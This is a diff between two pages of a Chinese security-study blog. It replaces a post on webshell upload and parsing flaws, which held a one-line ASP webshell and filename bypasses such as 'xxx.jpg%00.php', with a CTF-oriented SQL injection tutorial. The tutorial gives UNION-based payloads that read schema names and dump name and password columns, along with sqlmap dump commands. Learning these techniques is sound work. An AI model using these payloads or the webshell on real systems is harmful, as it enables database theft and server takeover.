@@ -6,20 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>webshell 上传/解析漏洞 | cruoni的博客</title>
+  <title>sql注入 | cruoni的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
-<meta name="keywords" content="web">
+  <meta name="description" content="https://blog.csdn.net/wuqiongrj/article/details/51995016 mysql 5.0版本以后提供了information.schema表，表中记录了数据库中所有的库、表、列等信息  information.schema.schemataSCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的">
+<meta name="keywords" content="机器学习 计算机视觉 信息安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="webshell 上传&#x2F;解析漏洞">
-<meta property="og:url" content="http://yoursite.com/2019/07/25/webshell-上传-解析漏洞/index.html">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://yoursite.com/2019/08/08/sql注入/index.html">
 <meta property="og:site_name" content="cruoni的博客">
-<meta property="og:description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
+<meta property="og:description" content="https://blog.csdn.net/wuqiongrj/article/details/51995016 mysql 5.0版本以后提供了information.schema表，表中记录了数据库中所有的库、表、列等信息  information.schema.schemataSCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-14T08:13:14.823Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190330233925194.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190330233947770.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190330233843352.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190613184610888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190613191841812.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/09/P47Cesx8OIEu2hQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/09/g2KjkB987NpXShE.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/09/XGFO2wA6YUcsrZg.png">
+<meta property="og:updated_time" content="2019-08-13T03:07:31.562Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="webshell 上传&#x2F;解析漏洞">
-<meta name="twitter:description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
+<meta name="twitter:title" content="sql注入">
+<meta name="twitter:description" content="https://blog.csdn.net/wuqiongrj/article/details/51995016 mysql 5.0版本以后提供了information.schema表，表中记录了数据库中所有的库、表、列等信息  information.schema.schemataSCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190330233925194.png">
   
     <link rel="alternative" href="/atom.xml" title="cruoni的博客" type="application/atom+xml">
   
@@ -145,43 +154,60 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-webshell-上传-解析漏洞" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-sql注入" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      webshell 上传/解析漏洞
+      sql注入
     </h1>
   
 
         
-        <a href="/2019/07/25/webshell-上传-解析漏洞/" class="archive-article-date">
-  	<time datetime="2019-07-25T07:48:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-25</time>
+        <a href="/2019/08/08/sql注入/" class="archive-article-date">
+  	<time datetime="2019-08-08T03:15:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1><span id="什么是webshell">什么是Webshell</span></h1><h2><span id="webshell定义">Webshell定义</span></h2><p>Web服务端的一种脚本工具</p>
-<h2><span id="webshell功能">Webshell功能</span></h2><ol>
-<li>环境探针</li>
-<li>资源管理器</li>
-<li>文件编辑器</li>
-<li>执行OS命令</li>
-<li>读取注册表</li>
-<li>创建Socket</li>
-<li>调用系统组件</li>
+        <p><a href="https://blog.csdn.net/wuqiongrj/article/details/51995016" target="_blank" rel="noopener">https://blog.csdn.net/wuqiongrj/article/details/51995016</a></p>
+<p>mysql 5.0版本以后提供了information.schema表，表中记录了数据库中所有的库、表、列等信息</p>
+<ol>
+<li><p>information.schema.schemata<br>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表</p>
+</li>
+<li><p>information.schema.tables<br>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表.</p>
+</li>
+<li><p>information.schema.columns<br>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，注释等。是show columns from schemaname.tablename的结果取之此表.</p>
+</li>
 </ol>
-<h2><span id="webshell的分类">Webshell的分类</span></h2><p>功能强弱分为大马、小马、一句话木马</p>
-<p>一句话木马：<br><code>%eval request(&quot;pass&quot;)%&gt;</code><br>eval 将request(“pass”)转化成代码执行 request功能：引用外部文件</p>
-<p>IIS 5.X/6.0 解析漏洞</p>
-<p>Is7.0/ IIS 7.5 /Nginx &lt; 0.83 畸形解析漏洞<br>xxx.jpg/.php</p>
-<p>Nginx 0.5 0.6 0.7-0.7.65 0.8-0.8.37 空字节代码执行漏洞<br>xxx.jpg%00.php</p>
-<p>Apache解析漏洞</p>
-<p>windows 不允许这两个文件存在 （末尾为.或空格）<br>xx.jpg.  xx.jpg_ (_为空格)<br>上传成功后会自动把 . _ 去掉</p>
+<p>找到注入点后，我们用order by语句查询数据库中存在多少数据表<br>确定多少个表，为了便于说明，假设有三个数据表，<br>    Order by 3 返回正常<br>    order by 4返回错误<br>然后使用and 1=2 union select 1，2，3 %23爆出可以回显敏感信息的位置,假设在2和3上</p>
+<p>下面我们就要查询敏感信息了，就要用到上面所说的系统函数了</p>
+<p>可以爆出当前使用版本和数据库名<br>and 1=2 union select 1,version(),database()</p>
+<p>爆出数据库名，依次使用limit2，1往下爆库名，也可以使用group_concat函数全部爆出来<br>and 1=2 union select 1,2,schema_name from information_schema.schemata limit 1,1 %23<br>and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata%23 。</p>
+<p>我们假设其中有flag库<br>and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where schema_name=’flag’ </p>
+<p>爆出flag库下的所有的表，假设其中有flagtable表<br>and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name =’flagtale’</p>
+<p>爆出flagtable下的所有字段，假设有name和password字段<br>and 1=2 union select 1,2,group_concat(name,password) from flag.flagtable爆出flag下的flagtable表的name和password的内容</p>
+<blockquote>
+<p>例:联合查询(手动)</p>
+<ol>
+<li>查询当前数据库中的所有表名：<br>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#<br><img src="https://img-blog.csdnimg.cn/20190330233925194.png" alt=""></li>
+<li>查询表中的列名：<br>1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’secret_table’#<br><img src="https://img-blog.csdnimg.cn/20190330233947770.png" alt=""></li>
+<li>得到flag：<br>1’ union select 1,2,fl4g from news.secret_table#<br><img src="https://img-blog.csdnimg.cn/20190330233843352.png" alt=""></li>
+</ol>
+</blockquote>
+<blockquote>
+<p>例:(sqlmap)<br>1.sqlmap -r xctfrequest.txt –dbs<br><img src="https://img-blog.csdnimg.cn/20190613184610888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0,size_16,color_FFFFFF,t_70" alt=""><br>发现存在POST注入，继续深入<br>sqlmap -r xctfrequest.txt -D news –tables<br>sqlmap -r xctfrequest.txt -D news -T secret_table  –columns<br>sqlmap -r xctfrequest.txt -D news -T secret_table -C “id,fl4g” –dump<br>当然也可以一次性把new数据库内的内容全部爆出来，这样就不用一步步找flag在哪了，直接了当，所以对于有目的，好寻找的我们可以使用第一种步步深入；如果比较难找，就第二种方法比较好<br>sqlmap -r xctfrequest.txt -D news –dump<br><img src="https://img-blog.csdnimg.cn/20190613191841812.png" alt=""></p>
+</blockquote>
+<p>奇技淫巧</p>
+<ol>
+<li>上传文件名注入<br>利用上传文件名进行sql注入<br><img src="https://i.loli.net/2019/08/09/P47Cesx8OIEu2hQ.png" alt=""></li>
+</ol>
+<p><img src="https://i.loli.net/2019/08/09/g2KjkB987NpXShE.png" alt=""></p>
+<p><img src="https://i.loli.net/2019/08/09/XGFO2wA6YUcsrZg.png" alt=""></p>
 
       
 
@@ -211,17 +237,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -272,7 +287,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/07/25/webshell-上传-解析漏洞/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/08/sql注入/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -286,18 +301,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/07/30/CG-CTF-Web/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/08/08/ByPassWAF思路/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          CG-CTF Web
+          ByPassWAF思路
         
       </div>
     </a>
   
   
-    <a href="/2019/07/25/SSRF/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">SSRF</div>
+    <a href="/2019/08/08/2019安全态势/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2019安全态势</div>
       <i class="icon-circle-right"></i>
     </a>
   
